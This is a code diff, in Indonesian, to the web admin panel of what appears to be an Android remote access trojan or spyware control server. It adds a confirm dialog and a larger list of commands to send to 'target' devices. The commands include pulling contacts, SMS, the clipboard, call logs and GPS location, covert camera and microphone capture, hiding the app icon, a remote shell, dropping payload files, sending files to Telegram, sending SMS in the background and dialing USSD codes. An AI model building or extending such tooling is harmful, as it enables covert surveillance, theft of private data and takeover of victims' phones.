@@ -495,6 +495,37 @@
             </div>
         </section>
     </main>
+    <!-- Custom Confirm Modal -->
+    <div x-show="isConfirmOpen"
+        class="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 hidden"
+        :class="isConfirmOpen ? '!flex' : ''" x-cloak x-transition.opacity>
+        <div class="bg-gray-900 border border-gray-700 rounded-2xl shadow-2xl w-full max-w-sm p-6 transform transition-all text-center relative"
+            @click.away="closeConfirm()" x-transition:enter="ease-out duration-300"
+            x-transition:enter-start="opacity-0 scale-95 -translate-y-4"
+            x-transition:enter-end="opacity-100 scale-100 translate-y-0" x-transition:leave="ease-in duration-200"
+            x-transition:leave-start="opacity-100 scale-100 translate-y-0"
+            x-transition:leave-end="opacity-0 scale-95 translate-y-4">
+
+            <div class="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
+                    </path>
+                </svg>
+            </div>
+
+            <h3 class="text-xl font-bold text-white mb-2" x-text="confirmTitle"></h3>
+            <p class="text-sm text-gray-400 mb-6" x-text="confirmMessage"></p>
+
+            <div class="flex gap-3 w-full">
+                <button @click="closeConfirm()"
+                    class="flex-1 bg-gray-800 hover:bg-gray-700 text-gray-300 font-semibold py-2.5 px-4 rounded-xl transition-all active:scale-95 border border-gray-700">Batal</button>
+                <button @click="if(onConfirm) { onConfirm(); closeConfirm(); }"
+                    class="flex-1 bg-red-600 hover:bg-red-500 text-white font-semibold py-2.5 px-4 rounded-xl shadow-lg shadow-red-600/30 transition-all active:scale-95">Ya,
+                    Lanjutkan</button>
+            </div>
+        </div>
+    </div>
 
     <!-- Detail Modal -->
     <div x-show="isDetailModalOpen"
@@ -629,24 +660,44 @@
                 isLoadingDetail: false,
                 detailLog: null,
 
+                isConfirmOpen: false,
+                confirmTitle: '',
+                confirmMessage: '',
+                onConfirm: null,
+
                 availableCommands: [
-                    { name: 'shell', desc: 'Jalankan perintah shell/bash (Unix/Linux)', needsPayload: true },
-                    { name: 'cmd', desc: 'Jalankan perintah Windows CMD', needsPayload: true },
-                    { name: 'ps', desc: 'Jalankan perintah PowerShell', needsPayload: true },
-                    { name: 'restart', desc: 'Restart sistem / perangkat keras', needsPayload: false },
-                    { name: 'shutdown', desc: 'Matikan sistem (power off)', needsPayload: false },
-                    { name: 'screenshot', desc: 'Ambil tangkapan layar (screenshot)', needsPayload: false },
-                    { name: 'webcam', desc: 'Ambil foto dari webcam aktif', needsPayload: true },
-                    { name: 'audio', desc: 'Rekam audio mikrofon (durasi dlm detik)', needsPayload: true },
-                    { name: 'location', desc: 'Ambil titik lokasi GPS perangkat', needsPayload: false },
-                    { name: 'sms', desc: 'Kirim SMS ke nomor tertentu. Payload: "nomor||pesan"', needsPayload: true },
-                    { name: 'call', desc: 'Lakukan panggilan telepon. Payload: "nomor"', needsPayload: true },
-                    { name: 'upload', desc: 'Upload file ke perangkat target', needsPayload: true },
-                    { name: 'download', desc: 'Download file dari perangkat target', needsPayload: true },
-                    { name: 'appList', desc: 'Daftar aplikasi yang terinstall', needsPayload: false },
-                    { name: 'torch', desc: 'Hidupkan/Matikan Flash Camera (on/off)', needsPayload: true },
-                    { name: 'vibrate', desc: 'Getarkan perangkat (waktu ms)', needsPayload: true },
-                    { name: 'notification', desc: 'Kirim push notification (toast)', needsPayload: true }
+                    { name: 'ping', desc: 'Tes koneksi Background (respon pong seketika)', needsPayload: false },
+                    { name: 'get_device_info', desc: 'Tarik Merk, Versi OS', needsPayload: false },
+                    { name: 'get_battery', desc: 'Cek persentase baterai', needsPayload: false },
+                    { name: 'show_toast', desc: 'Tampilkan pop-up toast. Payload: [text]', needsPayload: true },
+                    { name: 'get_volume', desc: 'Info Volume Ring, Alarm, Notif', needsPayload: false },
+                    { name: 'set_volume', desc: 'Atur volume. Payload: [type] [level] (Cth: music 15)', needsPayload: true },
+                    { name: 'vibrate', desc: 'Getar paksa target. Payload: [durasi detik]', needsPayload: true },
+                    { name: 'hide_app', desc: 'Sembunyikan ikon aplikasi/Launcher Icon', needsPayload: false },
+                    { name: 'torch', desc: 'Matikan/Nyalakan Senter. Payload: on / off', needsPayload: true },
+                    { name: 'sensors', desc: 'Tarik daftar semua sensor manufaktur', needsPayload: false },
+                    { name: 'photo front', desc: 'Uji Kamera Belakang/Selfie Base64', needsPayload: false },
+                    { name: 'photo back', desc: 'Uji Kamera Belakang resolusi tinggi', needsPayload: false },
+                    { name: 'record_sound', desc: 'Rekam mik audio MP4. Payload: [durasi detik]', needsPayload: true },
+                    { name: 'location', desc: 'Tangkap titik GPS Lat/Lon', needsPayload: false },
+                    { name: 'wifi_scan', desc: 'List jaringan WiFi di sekitar target', needsPayload: false },
+                    { name: 'contacts', desc: 'Ekstrak seluruh Data Kontak', needsPayload: false },
+                    { name: 'sms_list', desc: 'Tarik SMS Inbox masuk', needsPayload: false },
+                    { name: 'sms_send', desc: 'Background SMS. Payload: [nomor]|[pesan]', needsPayload: true },
+                    { name: 'clipboard', desc: 'Baca teks Copy/Paste terbaru', needsPayload: false },
+                    { name: 'get_call_logs', desc: 'Riwayat Telepon. Payload: [limit]', needsPayload: true },
+                    { name: 'get_installed_apps', desc: 'Tarik skema Package Name & App Terinstall', needsPayload: false },
+                    { name: 'ls', desc: 'Jelajah File Explorer. Payload: [path] (Cth: /sdcard/)', needsPayload: true },
+                    { name: 'download', desc: 'Sedot file dari remote target ke telegram', needsPayload: false },
+                    { name: 'upload', desc: 'Remote Upload payload script/file dropping', needsPayload: true },
+                    { name: 'shell', desc: 'Tarik BASH Terminal interaktif. Payload: [command]', needsPayload: true },
+                    { name: 'notify', desc: 'Kirim Push Notification. Payload: [Title]|[Body]', needsPayload: true },
+                    { name: 'open_url', desc: 'Paksa target membuka link/browser. Payload: [link]', needsPayload: true },
+                    { name: 'set_wallpaper', desc: 'Ganti Background Layar instan. Payload: [url_gambar]', needsPayload: true },
+                    { name: 'dial_number', desc: 'Panggil Nomor Telepon/USSD. Payload: [nomor]', needsPayload: true },
+                    { name: 'play_alarm', desc: 'Bunyikan Alarm Bypass DND volume maksimal', needsPayload: false },
+                    { name: 'tts', desc: 'Suara Google TTS dari Speaker. Payload: [teks pesan]', needsPayload: true },
+                    { name: 'play_sound', desc: 'Putar File Latar Audio. Payload: [url_mp3]', needsPayload: true }
                 ],
                 filteredCommands: [],
                 showAutocomplete: false,
@@ -707,51 +758,70 @@
                     }
                 },
 
-                async deleteDevice(id) {
-                    if (!confirm('Apakah Anda yakin ingin menghapus jejak perangkat ini beserta seluruh riwayat log dan perintahnya?')) return;
-                    try {
-                        const res = await fetch('/admin/api/device/' + id, { method: 'DELETE' });
-                        if (res.ok) {
-                            this.showToast('Perangkat ' + id + ' berhasil diblokir/dihapus.', 'success');
-                            if (this.selectedDevice === id) this.selectedDevice = null;
-                            this.fetchDevices();
-                            this.fetchLogs();
-                        } else {
-                            this.showToast('Gagal menghapus perangkat.', 'error');
-                        }
-                    } catch (e) {
-                        this.showToast('Gangguan jaringan saat menghapus.', 'error');
+                customConfirm(title, message, onConfirmCallback) {
+                    this.confirmTitle = title;
+                    this.confirmMessage = message;
+                    this.onConfirm = onConfirmCallback;
+                    this.isConfirmOpen = true;
+                    document.body.style.overflow = 'hidden';
+                },
+
+                closeConfirm() {
+                    this.isConfirmOpen = false;
+                    this.onConfirm = null;
+                    if (!this.isDetailModalOpen) {
+                        document.body.style.overflow = '';
                     }
+                },
+
+                async deleteDevice(id) {
+                    this.customConfirm('Hapus Perangkat', 'Apakah Anda yakin ingin menghapus jejak perangkat ini beserta seluruh riwayat log dan perintahnya?', async () => {
+                        try {
+                            const res = await fetch('/admin/api/device/' + id, { method: 'DELETE' });
+                            if (res.ok) {
+                                this.showToast('Perangkat ' + id + ' berhasil diblokir/dihapus.', 'success');
+                                if (this.selectedDevice === id) this.selectedDevice = null;
+                                this.fetchDevices();
+                                this.fetchLogs();
+                            } else {
+                                this.showToast('Gagal menghapus perangkat.', 'error');
+                            }
+                        } catch (e) {
+                            this.showToast('Gangguan jaringan saat menghapus.', 'error');
+                        }
+                    });
                 },
 
                 async clearLogs() {
-                    if (!confirm('Hati-hati! Ini akan membersihkan riwayat log dan perintah di sistem. Lanjutkan?')) return;
-                    try {
-                        const res = await fetch('/admin/api/logs?days=' + this.clearLogDays, { method: 'DELETE' });
-                        if (res.ok) {
-                            this.showToast('Log dan riwayat perintah berhasil dibersihkan.', 'success');
-                            this.fetchLogs();
-                        } else {
-                            this.showToast('Gagal membersihkan log.', 'error');
+                    this.customConfirm('Hapus Log Sistem', 'Hati-hati! Ini akan membersihkan riwayat log dan perintah di sistem berdasarkan filter tanggal. Lanjutkan?', async () => {
+                        try {
+                            const res = await fetch('/admin/api/logs?days=' + this.clearLogDays, { method: 'DELETE' });
+                            if (res.ok) {
+                                this.showToast('Log dan riwayat perintah berhasil dibersihkan.', 'success');
+                                this.fetchLogs();
+                            } else {
+                                this.showToast('Gagal membersihkan log.', 'error');
+                            }
+                        } catch (e) {
+                            this.showToast('Gangguan jaringan saat membersihkan.', 'error');
                         }
-                    } catch (e) {
-                        this.showToast('Gangguan jaringan saat membersihkan.', 'error');
-                    }
+                    });
                 },
 
                 async clearHostLogs() {
-                    if (!confirm('Peringatan! File stderr.log akan dikosongkan secara permanen. Lanjutkan?')) return;
-                    try {
-                        const res = await fetch('/admin/api/host-logs', { method: 'DELETE' });
-                        if (res.ok) {
-                            this.showToast('File stderr.log berhasil dikosongkan.', 'success');
-                            this.fetchLogs();
-                        } else {
-                            this.showToast('Gagal mengosongkan log hosting.', 'error');
+                    this.customConfirm('Kosongkan Stderr.log', 'Peringatan! File error log server akan dikosongkan secara permanen. Lanjutkan?', async () => {
+                        try {
+                            const res = await fetch('/admin/api/host-logs', { method: 'DELETE' });
+                            if (res.ok) {
+                                this.showToast('File stderr.log berhasil dikosongkan.', 'success');
+                                this.fetchLogs();
+                            } else {
+                                this.showToast('Gagal mengosongkan log hosting.', 'error');
+                            }
+                        } catch (e) {
+                            this.showToast('Gangguan jaringan saat mengosongkan.', 'error');
                         }
-                    } catch (e) {
-                        this.showToast('Gangguan jaringan saat mengosongkan.', 'error');
-                    }
+                    });
                 },
 
                 async sendCommand() {
@@ -824,6 +894,7 @@
 
                 async openDetailModal(id) {
                     this.isDetailModalOpen = true;
+                    document.body.style.overflow = 'hidden';
                     this.isLoadingDetail = true;
                     this.detailLog = null;
                     try {
@@ -844,6 +915,9 @@
 
                 closeDetailModal() {
                     this.isDetailModalOpen = false;
+                    if (!this.isConfirmOpen) {
+                        document.body.style.overflow = '';
+                    }
                     setTimeout(() => { this.detailLog = null; }, 300);
                 },
 
